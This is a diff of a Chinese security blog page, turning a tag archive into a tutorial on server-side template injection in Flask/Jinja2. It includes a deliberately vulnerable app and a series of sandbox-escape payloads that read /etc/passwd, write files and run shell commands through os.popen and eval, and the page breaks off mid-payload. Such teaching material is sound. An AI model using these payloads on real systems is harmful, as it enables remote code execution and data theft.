@@ -6,17 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: 文件包含漏洞 | smallwolf</title>
+  <title>SSTI模板注入漏洞总结 | smallwolf</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="个人技术博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="smallwolf">
-<meta property="og:url" content="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+  <meta name="description" content="任务驱动型学习ssti模板注入前言ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI模板注入漏洞总结">
+<meta property="og:url" content="http://example.com/2021/01/14/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="smallwolf">
-<meta property="og:description" content="个人技术博客">
+<meta property="og:description" content="任务驱动型学习ssti模板注入前言ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2020.cnblogs.com/blog/1357258/202011/1357258-20201115113717218-234354047.png">
+<meta property="article:published_time" content="2021-01-14T08:41:09.000Z">
+<meta property="article:modified_time" content="2021-01-24T16:14:01.649Z">
 <meta property="article:author" content="Tang zhen">
+<meta property="article:tag" content="SSTI模板注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2020.cnblogs.com/blog/1357258/202011/1357258-20201115113717218-234354047.png">
   
     <link rel="alternative" href="/atom.xml" title="smallwolf" type="application/atom+xml">
   
@@ -149,60 +154,408 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-SSTI模板注入漏洞总结" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2021-01-09T14:05:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-09</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/01/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">文件包含漏洞和伪协议学习总结</a>
+    <h1 class="article-title" itemprop="name">
+      SSTI模板注入漏洞总结
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/01/14/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="archive-article-date">
+  	<time datetime="2021-01-14T08:41:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-14</time>
+</a>
+        
+      </header>
+    
+
+<!-- 目录内容 -->
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+	<div id="toc-article" class="toc-article">
+	    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+		<strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E9%A9%B1%E5%8A%A8%E5%9E%8B%E5%AD%A6%E4%B9%A0ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">任务驱动型学习ssti模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-number">1.3.</span> <span class="toc-text">目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#python-flask%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.4.1.</span> <span class="toc-text">python flask框架基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flask"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">flask</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.1.1.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.1.1.2.</span> <span class="toc-text">渲染方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80flask%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.4.1.1.3.</span> <span class="toc-text">基础flask源码分析</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">1.4.1.2.1.</span> <span class="toc-text">语法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.4.1.2.2.</span> <span class="toc-text">过滤器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.4.2.</span> <span class="toc-text">SSTI模板注入学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">模板引擎</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">漏洞原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.3.</span> <span class="toc-text">沙盒逃逸基础知识及绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">什么是沙盒逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">沙盒逃逸的过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%86%85%E5%BB%BA%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">一些内建的魔术方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.4.3.4.</span> <span class="toc-text">利用语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.4.3.5.</span> <span class="toc-text">绕过姿势</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">任务解决方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">基础语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E8%AF%8D%E6%A3%80%E6%B5%8B"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">绕过关键词检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">1.5.0.3.</span> <span class="toc-text">绕过引号过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">1.5.0.4.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li></ol>
+         </div>
+   <script type="text/javascript">
+	function showToc(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:block");
+		show_toc_btn.setAttribute("style","display:none");
+		};
+	function showBtn(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:none");
+		show_toc_btn.setAttribute("style","display:block");
+		};
+   </script>
+      
+<!-- 目录内容结束 -->
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="任务驱动型学习ssti模板注入"><a href="#任务驱动型学习ssti模板注入" class="headerlink" title="任务驱动型学习ssti模板注入"></a>任务驱动型学习ssti模板注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p>
+<a id="more"></a>
+
+<h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>学习flask_ssti及Python沙箱逃逸，要求掌握漏洞原理及基础绕过手段，在下列环境完整读取到文件目录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- codeing = utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2021/1/16 20:21</span></span><br><span class="line"><span class="comment"># @Author : smallwolf</span></span><br><span class="line"><span class="comment"># @File : app.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/hello&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_hello</span>():</span></span><br><span class="line">    black_char_list = [<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;class&quot;</span>]</span><br><span class="line">    template = <span class="string">&#x27;Hello &#x27;</span> + request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> template:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> black_char_list:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Hacker&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">9999</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul>
+<li>掌握python flask框架的基础知识</li>
+<li>对ssti模板注入有基本了解</li>
+<li>可以进行基本的沙盒逃逸</li>
+</ul>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="python-flask框架基础知识"><a href="#python-flask框架基础知识" class="headerlink" title="python flask框架基础知识"></a>python flask框架基础知识</h3><h4 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a><strong>定义</strong></h5><p>Flask是一个Python编写的Web 微框架，让我们可以使用Python语言快速实现一个网站或Web服务。Flask是一个内核，默认依赖于2个外部库： <strong>Jinja2 模板引擎和 WSGI工具集–Werkzeug</strong> </p>
+<h5 id="渲染方法"><a href="#渲染方法" class="headerlink" title="渲染方法"></a><strong>渲染方法</strong></h5><p><strong>render_template()</strong></p>
+<p>渲染一个指定的文件，这个指定的文件其实就是模板</p>
+<p><strong>render_template_string()</strong></p>
+<p>渲染一个字符串，经常会被利用！！！</p>
+<p>eg：</p>
+<p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/test&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    html = <span class="string">&#x27;&#123; &#123;12*12&#125; &#125;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html)</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<p>运行后网页会显示144，{ { } }中的语句被执行了</p>
+<h5 id="基础flask源码分析"><a href="#基础flask源码分析" class="headerlink" title="基础flask源码分析"></a>基础flask源码分析</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 导入flask,我们要用flask,就必须导入Flask</span></span><br><span class="line"><span class="keyword">from</span>  flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="comment"># 2 生成一个Flask对象,__name__表示当前文件的名字</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 3 添加路由，flask用的是装饰器的模式</span></span><br><span class="line"><span class="comment">#注册路由，并写响应函数index</span></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello flask&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#4 启动flask</span></span><br><span class="line">    <span class="comment">#run里面是执行了run_simple（host,port，self=app,也就是flask对象）</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<h4 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h4><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><p>在jinja2中存在三种语法</p>
+<ol>
+<li>控制结构 { { % % } }</li>
+<li>变量取值 { { } }</li>
+<li>注释 { # # }</li>
+</ol>
+<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>变量可以通过“过滤器”进行修改，可以理解为是jinja2里面的内置函数和字符串处理函数。</p>
+<p><strong>使用方法</strong></p>
+<p>在变量后面使用管道（|）分割，多个过滤器可以链式调用，前一个过滤器的输出会作为后一个过滤器的输入。</p>
+<p>eg</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;abc&#x27;</span> | captialize  &#125;&#125;</span><br><span class="line"><span class="comment"># Abc</span></span><br><span class="line"> </span><br><span class="line">&#123;&#123; <span class="string">&#x27;abc&#x27;</span> | upper  &#125;&#125;</span><br><span class="line"><span class="comment"># ABC</span></span><br><span class="line"> </span><br><span class="line">&#123;&#123; <span class="string">&#x27;hello world&#x27;</span> | title  &#125;&#125;</span><br><span class="line"><span class="comment"># Hello World</span></span><br><span class="line"> </span><br><span class="line">&#123;&#123; <span class="string">&quot;hello world&quot;</span> | replace(<span class="string">&#x27;world&#x27;</span>,<span class="string">&#x27;daxin&#x27;</span>) | upper &#125;&#125;</span><br><span class="line"><span class="comment"># HELLO DAXIN</span></span><br><span class="line"> </span><br><span class="line">&#123;&#123; <span class="number">18.18</span> | <span class="built_in">round</span> | <span class="built_in">int</span> &#125;&#125;</span><br><span class="line"><span class="comment"># 18</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>常见过滤器</strong></p>
+<ul>
+<li>safe:      渲染时值不转义</li>
+<li>capitialize:   把值的首字母转换成大写，其他子母转换为小写</li>
+<li>lower:    把值转换成小写形式</li>
+<li>upper:    把值转换成大写形式</li>
+<li>title:    把值中每个单词的首字母都转换成大写</li>
+<li>trim:      把值的首尾空格去掉</li>
+<li>striptags:    渲染之前把值中所有的HTML标签都删掉</li>
+<li>join:      拼接多个值为字符串</li>
+<li>replace:      替换字符串的值</li>
+<li>round:  默认对数字进行四舍五入，也可以用参数进行控制</li>
+<li>int:       把值转换成整型</li>
+</ul>
+<h3 id="SSTI模板注入学习"><a href="#SSTI模板注入学习" class="headerlink" title="SSTI模板注入学习"></a>SSTI模板注入学习</h3><h4 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h4><p>可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，只需要获取用户的数据，然后放到渲染函数里，接着生成模板+用户数据的前端html页面，最后反馈给浏览器，呈现在用户面前。</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>与大多数的注入本质相同，<strong>当用户输入的数据没有被合理的处理控制时，就有可能数据插入了程序段变成了程序的一部分，从而改变了程序的运行逻辑。</strong></p>
+<p><img src="https://img2020.cnblogs.com/blog/1357258/202011/1357258-20201115113717218-234354047.png" alt="附表"></p>
+<h3 id="沙盒逃逸基础知识及绕过方法"><a href="#沙盒逃逸基础知识及绕过方法" class="headerlink" title="沙盒逃逸基础知识及绕过方法"></a>沙盒逃逸基础知识及绕过方法</h3><h4 id="什么是沙盒逃逸"><a href="#什么是沙盒逃逸" class="headerlink" title="什么是沙盒逃逸"></a>什么是沙盒逃逸</h4><p>沙盒逃逸，就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终成功拿到shell权限的过程。</p>
+<h4 id="沙盒逃逸的过程"><a href="#沙盒逃逸的过程" class="headerlink" title="沙盒逃逸的过程"></a>沙盒逃逸的过程</h4><p>变量对象=》找到所属类型=》回溯基类=》寻找可利用子类=》获取全局变量                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </p>
+<p>借助的主要是各个类之间的继承关系</p>
+<h4 id="一些内建的魔术方法"><a href="#一些内建的魔术方法" class="headerlink" title="一些内建的魔术方法"></a>一些内建的魔术方法</h4><ul>
+<li>__class__：用来查看变量所属的类，根据前面的变量形式可用得到其所属的类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>__bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值</li>
+<li>__mro__：递归地显示父类一直到 object</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line">--------------------------------------------------</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__</span><br><span class="line">(&lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__mro__[<span class="number">1</span>]  <span class="comment"># 使用索引就能获取基类了</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>__subclasses__()：查看当前类的子类，以元祖形式返回。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用语句"><a href="#利用语句" class="headerlink" title="利用语句"></a>利用语句</h4><p><strong>读文件</strong></p>
+<p>py2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p>py3</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;cat /fl4g|base64&#x27;</span>).read()&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">189</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>写文件</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp&#x27;</span>).write(<span class="string">&#x27;test&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行命令</strong></p>
+<p>object.<strong>subclasses</strong>()[59].<strong>init</strong>.func_globals.linecache下直接有os类，可以直接执行命令：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br></pre></td></tr></table></figure>
+
+<p>object.<strong>subclasses</strong>()[59].<strong>init</strong>.<strong>globals</strong>.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span 